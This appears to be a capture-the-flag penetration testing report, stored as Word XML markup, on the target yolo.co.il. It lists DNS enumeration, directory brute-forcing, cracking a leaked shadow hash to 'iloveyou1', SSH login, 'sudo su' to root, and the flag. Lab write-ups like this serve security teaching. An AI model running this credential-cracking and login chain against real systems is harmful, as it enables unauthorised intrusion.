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Penetration Testing Report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Target:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Domain:** yolo.co.il</w:t>
        <w:br/>
        <w:t>**IP Address:** 10.1.22.124</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Tools Used:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- dnsenum: DNS enumeration tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- dirbuster: Directory and file brute-forcing tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- John the Ripper: Password cracking tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- nmap: Network scanner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- SSH: Secure Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- ls: List directory contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. DNS Enumeration of yolo.co.il</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The penetration test began with DNS enumeration of yolo.co.il using dnsenum. This revealed key details such as the IP address and name server information.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>dnsenum --enum yolo.co.il</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Output:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>IP Address of yolo.co.il: 10.1.22.124</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mail Server: Not found</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Name Server: 10.1.22.124</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Zone Transfer: Connection refused</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Brute-force Subdomain Enumeration Results:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- admin.yolo.co.il (A record: 10.1.22.124)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- ftp.yolo.co.il (A record: 192.168.2.8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Directory Busting of admin.yolo.co.il</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>dirbuster -u http://admin.yolo.co.il -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Result:**</w:t>
        <w:br/>
        <w:t>- Directory Found: /admin/backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Extracting File from /admin/backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Inside /admin/backup, a file containing sensitive data was discovered. Analysis of the file revealed an entry from /etc/shadow:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- **User**: dexter</w:t>
        <w:br/>
        <w:t>- **Password Hash**: $y$j9T$FVrhmaG8xav3NzNyqvkUN.$cKOnOMgGXDigPZRfgnGLP9egOrZgHmqVmPIOwXgB2zD</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cracking Password with John the Ripper</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>john --format=crypt /path/to/shadow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Output:**</w:t>
        <w:br/>
        <w:t>- **Password**: iloveyou1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. SSH Access as dexter</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The nmap scan identified the SSH service running on port 2222. Using the cracked credentials, an SSH connection was established.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>ssh dexter@10.1.22.124 -p 2222</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Successful login was achieved as dexter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Upon login, an attempt to escalate privileges was made. The dexter user was found to have sudo access.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>sudo su</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This granted root access to the system.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Finding the Flag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>With root access, a hidden flag file was located using directory listing commands.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Command:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>bash</w:t>
        <w:br/>
        <w:t>ls -la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Discovered File:** flag1.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t>**Flag Content:**</w:t>
        <w:br/>
        <w:br/>
        <w:t>flag{hidden_flag_1234}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The penetration test successfully identified and exploited security weaknesses in yolo.co.il. The key takeaways are:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- DNS enumeration revealed subdomains.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Directory busting exposed a sensitive backup directory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- A password hash was extracted and cracked.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- SSH access was gained as dexter.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Privileges were escalated to root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- A hidden flag file was discovered.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This assessment highlights vulnerabilities that should be addressed to enhance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